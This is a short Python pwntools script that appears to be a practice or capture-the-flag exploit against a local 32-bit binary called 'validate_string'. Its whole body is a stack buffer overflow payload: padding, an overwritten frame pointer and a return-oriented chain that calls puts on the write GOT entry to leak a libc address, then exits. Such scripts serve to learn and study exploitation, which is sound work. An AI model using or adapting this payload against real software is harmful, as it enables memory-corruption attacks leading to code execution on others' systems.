#!/usr/bin/python
import sys
import struct
from pwn import *

# maybe a four-byte read primitive
# 0x08049109 : mov ebx, dword ptr [esp] ; ret

e = ELF("./validate_string")
libc = ELF("/lib32/libc.so.6")
p = process(e.path)

deadcode     = p32(0xdeadc0de)
puts_plt     = p32(0x08049090)
exit_plt     = p32(0x080490a0)
write_got    = p32(0x0804c024)
pop_ebx_ret  = p32(0x0804901e)
respond      = p32(0x080491e6)

payload = b'A'*68
payload += b'B'*8        # ebp
payload += puts_plt      # first func to jump to
payload += pop_ebx_ret   # after puts, pop one arg before going to respond
payload += write_got     # arg for puts
payload += exit_plt      # return from read

sys.stdout.buffer.write(payload)
